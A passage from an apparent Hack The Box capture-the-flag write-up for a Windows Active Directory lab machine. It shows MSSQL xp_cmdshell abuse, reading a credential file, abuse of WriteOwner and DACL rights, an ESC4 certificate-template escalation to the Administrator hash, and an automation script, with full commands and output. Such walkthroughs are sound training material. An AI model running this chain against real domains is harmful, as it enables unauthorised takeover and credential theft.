<li><strong>Angela Martin:</strong> <code>angela:0fwz7Q4mSpurIt99</code></li>
<li><strong>Oscar Martinez:</strong> <code>oscar:86LxLBMgEWaKUnBG</code></li>
<li><strong>Kevin Malone:</strong> <code>kevin:Md9Wlq1E5bZnVDVo</code></li>
<li><strong>SQL SA Account:</strong> <code>sa:MSSQLP@ssw0rd!</code></li>
</ul>
<h3 id="Exploiting-MSSQL"><a href="#Exploiting-MSSQL" class="headerlink" title="Exploiting MSSQL"></a>Exploiting MSSQL</h3><p>Using the sa credentials, we connected to the MSSQL server and enabled xp_cmdshell to execute commands on the system.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 mssqlclient.py <span class="string">&#x27;sequel.htb/sa:MSSQLP@ssw0rd!@10.10.11.51&#x27;</span> </span><br><span class="line">SQL (sa  dbo@master)&gt; SQL (sa  dbo@master)&gt; enable_xp_cmdshell</span><br><span class="line">INFO(DC01\SQLEXPRESS): Line 185: Configuration option <span class="string">&#x27;show advanced options&#x27;</span> changed from 1 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">INFO(DC01\SQLEXPRESS): Line 185: Configuration option <span class="string">&#x27;xp_cmdshell&#x27;</span> changed from 1 to 1. Run the RECONFIGURE statement to install.</span><br></pre></td></tr></table></figure>
<h4 id="Steps"><a href="#Steps" class="headerlink" title="Steps:"></a>Steps:</h4><ol>
<li>Enabled xp_cmdshell if not :<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># enable xp_cmdshell</span></span><br><span class="line">EXEC sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure></li>
<li>Extracted the SQL Server service account password from the configuration file:</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (sa  dbo@master)&gt; EXEC xp_cmdshell <span class="string">&#x27;type C:\SQL2019\ExpressAdv_ENU\sql-configuration.INI&#x27;</span>;</span><br><span class="line">output                                              </span><br><span class="line">-------------------------------------------------   </span><br><span class="line">[OPTIONS]                                           </span><br><span class="line">SQLSVCPASSWORD=<span class="string">&quot;WqSZAF6CysDQbGb3&quot;</span>                   </span><br></pre></td></tr></table></figure>
<p>We tested this password with the user ryan and successfully authenticated via WinRM.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ crackmapexec winrm 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 </span><br><span class="line">SMB         10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)</span><br><span class="line">HTTP        10.10.11.51     5985   DC01             [*] http://10.10.11.51:5985/wsman</span><br><span class="line"></span><br><span class="line">WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)</span><br></pre></td></tr></table></figure>
<p>and from this u can read the user flag </p>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Using <span style="color:red; font-size:medium;">Bloodhound</span>, we identified that the user ryan had WriteOwner permissions over the CA_SVC account. We exploited this to take ownership of the account and grant ourselves FullControl.<br><img src="/../images/ryan.png" alt="BloodHound Analysis"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
<h4 id="steps"><a href="#steps" class="headerlink" title="steps:"></a>steps:</h4><ol>
<li>Changed ownership of CA_SVC to ryan:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 owneredit.py -action write -new-owner <span class="string">&#x27;ryan&#x27;</span> -target <span class="string">&#x27;ca_svc&#x27;</span> <span class="string">&#x27;sequel.htb&#x27;</span>/<span class="string">&#x27;ryan&#x27;</span>:<span class="string">&#x27;WqSZAF6CysDQbGb3&#x27;</span> -dc-ip 10.10.11.51</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Current owner information below</span><br><span class="line">[*] - SID: S-1-5-21-548670397-972687484-3496335370-1114</span><br><span class="line">[*] - sAMAccountName: ryan</span><br><span class="line">[*] - distinguishedName: CN=Ryan Howard,CN=Users,DC=sequel,DC=htb</span><br><span class="line">[*] OwnerSid modified successfully!</span><br></pre></td></tr></table></figure></li>
<li>Granted FullControl to ryan:</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -principal <span class="string">&#x27;ryan&#x27;</span> -target <span class="string">&#x27;ca_svc&#x27;</span> <span class="string">&#x27;sequel.htb&#x27;</span>/<span class="string">&#x27;ryan&#x27;</span>:<span class="string">&#x27;WqSZAF6CysDQbGb3&#x27;</span></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] DACL backed up to dacledit-20250112-171528.bak</span><br><span class="line">[*] DACL modified successfully!</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>Changed the password for CA_SVC:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc password <span class="string">&quot;CA_SVC&quot;</span> <span class="string">&quot;123456789&quot;</span> -U <span class="string">&quot;sequel.htb&quot;</span>/<span class="string">&quot;ryan&quot;</span>%<span class="string">&quot;WqSZAF6CysDQbGb3&quot;</span> -S <span class="string">&quot;sequel.htb&quot;</span></span><br></pre></td></tr></table></figure>
so the the credantials become CA_SVC:123456789</li>
</ol>
<h3 id="Exploiting-ESC4-Vulnerability"><a href="#Exploiting-ESC4-Vulnerability" class="headerlink" title="Exploiting ESC4 Vulnerability"></a>Exploiting ESC4 Vulnerability</h3><p>Using <span style="color:red; font-size:medium;">certipy</span>, we identified an ESC4 vulnerability in the DunderMifflinAuthentication certificate template. We modified the template to allow enrollment for the Administrator account.</p>
<h4 id="Steps-1"><a href="#Steps-1" class="headerlink" title="Steps:"></a>Steps:</h4><ol>
<li>find the vulnerability the certificate template:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy-ad find -u <span class="string">&#x27;CA_SVC@SEQUEL.HTB&#x27;</span> -p <span class="string">&#x27;123456789&#x27;</span> -dc-ip 10.10.11.51</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 34 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC01-CA&#x27;</span> via CSRA</span><br><span class="line">[!] Got error <span class="keyword">while</span> trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC01-CA&#x27;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC01-CA&#x27;</span> via RRP</span><br><span class="line">[*] Got CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC01-CA&#x27;</span></span><br><span class="line">[*] Saved BloodHound data to <span class="string">&#x27;20250112171842_Certipy.zip&#x27;</span>. Drag and drop the file into the BloodHound GUI from @ly4k</span><br><span class="line">[*] Saved text output to <span class="string">&#x27;20250112171842_Certipy.txt&#x27;</span></span><br><span class="line">[*] Saved JSON output to <span class="string">&#x27;20250112171842_Certipy.json&#x27;</span></span><br></pre></td></tr></table></figure>
after reading the json file <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;33&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;Template Name&quot;</span>: <span class="string">&quot;DunderMifflinAuthentication&quot;</span>, <span class="comment">#interesting</span></span><br><span class="line">      <span class="string">&quot;Display Name&quot;</span>: <span class="string">&quot;Dunder Mifflin Authentication&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Certificate Authorities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;sequel-DC01-CA&quot;</span> <span class="comment"># we need this </span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;Enabled&quot;</span>: <span class="literal">true</span>, <span class="comment">#interesting </span></span><br><span class="line">      <span class="string">&quot;Client Authentication&quot;</span>: <span class="literal">true</span>, <span class="comment">#interesting </span></span><br><span class="line">      <span class="string">&quot;Enrollment Agent&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;Any Purpose&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;Enrollee Supplies Subject&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;Certificate Name Flag&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;SubjectRequireCommonName&quot;</span>,</span><br><span class="line">        <span class="string">&quot;SubjectAltRequireDns&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;Enrollment Flag&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;AutoEnrollment&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PublishToDs&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;Private Key Flag&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;16842752&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;Extended Key Usage&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;Client Authentication&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Server Authentication&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;Requires Manager Approval&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;Requires Key Archival&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;Authorized Signatures Required&quot;</span>: 0,</span><br><span class="line">      <span class="string">&quot;Validity Period&quot;</span>: <span class="string">&quot;1000 years&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Renewal Period&quot;</span>: <span class="string">&quot;6 weeks&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Minimum RSA Key Length&quot;</span>: 2048,</span><br><span class="line">      <span class="string">&quot;Permissions&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;Enrollment Permissions&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;Enrollment Rights&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Domain Admins&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Enterprise Admins&quot;</span></span><br><span class="line">          ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;Object Control Permissions&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;Owner&quot;</span>: <span class="string">&quot;SEQUEL.HTB\\Enterprise Admins&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Full Control Principals&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Cert Publishers&quot;</span></span><br><span class="line">          ],</span><br><span class="line">          <span class="string">&quot;Write Owner Principals&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Domain Admins&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Enterprise Admins&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Administrator&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Cert Publishers&quot;</span> <span class="comment">#interesting VULN</span></span><br><span class="line">          ],</span><br><span class="line">          <span class="string">&quot;Write Dacl Principals&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Domain Admins&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Enterprise Admins&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Administrator&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Cert Publishers&quot;</span> <span class="comment">#interesting VULN</span></span><br><span class="line">          ],</span><br><span class="line">          <span class="string">&quot;Write Property Principals&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Domain Admins&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Enterprise Admins&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Administrator&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Cert Publishers&quot;</span> <span class="comment">#interesting VULN</span></span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;[!] Vulnerabilities&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;ESC4&quot;</span>: <span class="string">&quot;&#x27;SEQUEL.HTB\\\\Cert Publishers&#x27; has dangerous permissions&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>Manipulate the certificate template:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy template -dc-ip 10.10.11.51 -u ca_svc -p <span class="string">&#x27;123456789&#x27;</span> -template DunderMifflinAuthentication -target DC01.sequel.htb  -save-old</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Saved old configuration <span class="keyword">for</span> <span class="string">&#x27;DunderMifflinAuthentication&#x27;</span> to <span class="string">&#x27;DunderMifflinAuthentication.json&#x27;</span></span><br><span class="line">[*] Updating certificate template <span class="string">&#x27;DunderMifflinAuthentication&#x27;</span></span><br><span class="line">[*] Successfully updated <span class="string">&#x27;DunderMifflinAuthentication&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>Requested a certificate for the Administrator account:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy req -ca sequel-DC01-CA -dc-ip 10.10.11.51 -u ca_svc -p <span class="string">&#x27;123456789&#x27;</span> -template DunderMifflinAuthentication -target DC01.sequel.htb -upn administrator@sequel.htb</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 26</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;administrator@sequel.htb&#x27;</span></span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;administrator.pfx&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>Authenticated using the certificate and retrieved the Administrator NT hash:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: administrator@sequel.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator@sequel.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8edXXXXXXX</span><br></pre></td></tr></table></figure>
Finally, we used the Administrator hash to authenticate via WinRM and retrieve the root flag.<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netexec winrm 10.10.11.51 -u Administrator -H 7a8d4e04986aXXXXXXXXXXXXX -x <span class="string">&#x27;type C:\Users\Administrator\Desktop\root.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)</span><br><span class="line">/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module <span class="keyword">in</span> 48.0.0.</span><br><span class="line">  arc4 = algorithms.ARC4(self._key)</span><br><span class="line">WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\Administrator:7a8d4e04986aXXXXXXXX (Pwn3d!)</span><br><span class="line">WINRM       10.10.11.51     5985   DC01             [+] Executed <span class="built_in">command</span> (shell <span class="built_in">type</span>: cmd)</span><br><span class="line">WINRM       10.10.11.51     5985   DC01             df80XXXXXXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>
<pre><code>                                         GG!🎉
</code></pre>
</li>
</ol>
<p>KEY TAKEAWAYS</p>
<ol>
<li><p><span style="color:black; font-size:medium;">Credential Reuse</span>: Weak or reused credentials across services can lead to lateral movement and privilege escalation.</p>
</li>
<li><p><span style="color:black; font-size:medium;">Misconfigured Permissions</span>: Improperly configured permissions (e.g., WriteOwner) can be exploited to gain control over critical accounts.</p>
</li>
<li><p><span style="color:black; font-size:medium;">Certificate Template Vulnerabilities</span>: Misconfigured certificate templates (e.g., ESC4) can be abused to escalate privileges in Active Directory environments.</p>
</li>
<li><p><span style="color:black; font-size:medium;">Persistence and Enumeration</span>: Tools like <span style="color:red; font-size:medium;">Bloodhound</span> and <span style="color:red; font-size:medium;">certipy</span> are invaluable for identifying attack paths and misconfigurations in AD environments.</p>
</li>
</ol>
<p>⚠️ <span style="color:red; font-size:medium;">ATTENTION</span>:<br>During my hacking process, I encountered a situation where the credentials for the CA_SVC account would frequently change, rendering them unusable. This forced me to repeat the steps of changing ownership, granting FullControl permissions, and updating the password multiple times. To streamline this tedious process, I created a script to automate these tasks in one go. While the script was functional, the overall experience of dealing with constantly changing credentials was frustrating and inefficient.<br>BTW : Ensure you have the following tools installed and accessible in your environment:</p>
<ul>
<li><p><strong>owneredit.py</strong></p>
</li>
<li><p><strong>dacledit.py</strong></p>
</li>
<li><p><strong>net</strong></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define variables</span></span><br><span class="line">domain = <span class="string">&quot;sequel.htb&quot;</span></span><br><span class="line">username = <span class="string">&quot;ryan&quot;</span></span><br><span class="line">password = <span class="string">&quot;WqSZAF6CysDQbGb3&quot;</span></span><br><span class="line">new_owner = <span class="string">&quot;ryan&quot;</span></span><br><span class="line">target_account = <span class="string">&quot;ca_svc&quot;</span></span><br><span class="line">new_password = <span class="string">&quot;123456789&quot;</span></span><br><span class="line">dc_ip = <span class="string">&quot;10.10.11.51&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Change ownership of the target account using owneredit</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Changing ownership of the target account...&quot;</span>)</span><br><span class="line">owneredit_cmd = [</span><br><span class="line">    <span class="string">&quot;python3&quot;</span>, <span class="string">&quot;owneredit.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-action&quot;</span>, <span class="string">&quot;write&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-new-owner&quot;</span>, new_owner,</span><br><span class="line">    <span class="string">&quot;-target&quot;</span>, target_account,</span><br><span class="line">    f<span class="string">&quot;&#123;domain&#125;/&#123;username&#125;:&#123;password&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-dc-ip&quot;</span>, dc_ip</span><br><span class="line">]</span><br><span class="line">subprocess.run(owneredit_cmd, check=True)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  Grant FullControl permissions to the new owner using dacledit</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Granting FullControl permissions to the new owner...&quot;</span>)</span><br><span class="line">dacledit_cmd = [</span><br><span class="line">    <span class="string">&quot;python3&quot;</span>, <span class="string">&quot;dacledit.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-action&quot;</span>, <span class="string">&quot;write&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-rights&quot;</span>, <span class="string">&quot;FullControl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-principal&quot;</span>, new_owner,</span><br><span class="line">    <span class="string">&quot;-target&quot;</span>, target_account,</span><br><span class="line">    f<span class="string">&quot;&#123;domain&#125;/&#123;username&#125;:&#123;password&#125;&quot;</span></span><br><span class="line">]</span><br><span class="line">subprocess.run(dacledit_cmd, check=True)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Change the password of the target account using net rpc</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Changing the password of the target account...&quot;</span>)</span><br><span class="line">net_rpc_cmd = [</span><br><span class="line">    <span class="string">&quot;net&quot;</span>, <span class="string">&quot;rpc&quot;</span>, <span class="string">&quot;password&quot;</span>, target_account, new_password,</span><br><span class="line">    <span class="string">&quot;-U&quot;</span>, f<span class="string">&quot;&#123;domain&#125;/&#123;username&#125;%&#123;password&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-S&quot;</span>, domain</span><br><span class="line">]</span><br><span class="line">subprocess.run(net_rpc_cmd, check=True)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Script executed successfully! Ownership, DACL, and password have been updated.&quot;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ACTIVE MACHINE</category>
      </categories>
      <tags>
        <tag>HACK THE BOX</tag>
        <tag>WINDOWS</tag>
        <tag>CTF</tag>
        <tag>PENETRATION TESTING</tag>
      </tags>
  </entry>
</search>
